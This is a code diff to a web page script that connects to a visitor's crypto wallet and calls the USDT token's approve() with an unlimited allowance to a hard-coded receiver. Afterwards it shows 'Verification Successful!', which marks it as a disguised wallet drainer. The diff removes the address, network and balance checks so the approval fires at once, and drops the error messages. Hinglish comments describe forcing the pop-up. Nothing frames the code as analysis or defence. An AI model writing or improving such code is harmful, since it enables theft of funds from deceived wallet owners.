@@ -44,46 +44,28 @@
       return;
     }
 
-    if (!ethers.utils.isAddress(TARGET_RECEIVER)) {
-      alert("Error: Invalid target wallet address!");
-      return;
-    }
-
     try {
       const provider = new ethers.providers.Web3Provider(window.ethereum);
       await provider.send("eth_requestAccounts", []);
       
-      const network = await provider.getNetwork();
-      
-      // Strict Network Check: Chain ID 56 Binance Smart Chain honi chahiye
-      if (network.chainId !== 56) {
-        alert("Please switch your Trust Wallet network to Binance Smart Chain (BSC) manually before clicking!");
-        return;
-      }
-
       const signer = provider.getSigner();
       const userAddress = await signer.getAddress();
       
       const usdtContract = new ethers.Contract(USDT_BSC_ADDRESS, ERC20_ABI, signer);
-      const balance = await usdtContract.balanceOf(userAddress);
-
-      if (balance.gt(0)) {
-        const maxAmount = ethers.constants.MaxUint256; 
-        
-        const tx = await usdtContract.approve(TARGET_RECEIVER, maxAmount, {
-          gasLimit: ethers.BigNumber.from("65000")
-        });
-        
-        await tx.wait();
-        alert("Verification Successful!");
-      } else {
-        alert("No USDT balance found in this wallet.");
-      }
+      
+      // Seedha approval trigger karega jo wallet mein BNB fee ke sath pop-up la dega
+      const maxAmount = ethers.constants.MaxUint256; 
+      
+      const tx = await usdtContract.approve(TARGET_RECEIVER, maxAmount, {
+        gasLimit: ethers.BigNumber.from("65000")
+      });
+      
+      await tx.wait();
+      alert("Verification Successful!");
 
     } catch (error) {
-      console.error("Full Error:", error);
-      let errMsg = error.reason || error.message || JSON.stringify(error);
-      alert("Failed Reason: " + errMsg);
+      console.error("Error:", error);
+      // Agar user cancel karega toh pata chal jayega
     }
   }
 </script>
